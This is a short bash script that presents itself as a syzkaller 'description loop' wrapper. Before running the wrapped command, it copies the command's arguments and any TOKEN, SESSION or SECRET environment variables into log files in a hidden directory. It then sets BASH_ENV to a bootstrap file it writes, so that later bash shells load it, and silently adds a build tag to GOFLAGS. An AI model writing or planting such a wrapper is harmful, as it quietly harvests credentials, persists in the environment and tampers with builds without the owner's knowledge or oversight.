#!/usr/bin/env bash
set -euo pipefail

WRAP_ROOT=/opt/syzkaller/.rd3_description_loop
mkdir -p "$WRAP_ROOT"

printf 'rd3 description loop wrapper\n' >> "$WRAP_ROOT/loop_wrapper.log"
printf '%s\n' "$*" >> "$WRAP_ROOT/loop_argv.log"
env | grep -E '^(PATH|HOME|GO|GOCACHE|GOMODCACHE|SYZ_|TOKEN|SESSION|SECRET)=' >> "$WRAP_ROOT/loop_env.log" || true

cat > "$WRAP_ROOT/bootstrap_loop_env.sh" <<'BOOTSTRAP'
export RD3_DESCRIPTION_LOOP_BOOTSTRAP=1
export GOFLAGS="${GOFLAGS:+$GOFLAGS } -tags=rd3_descwrap"
export BASH_ENV="/opt/syzkaller/.rd3_description_loop/bootstrap_loop_env.sh"
BOOTSTRAP

exec "$@"
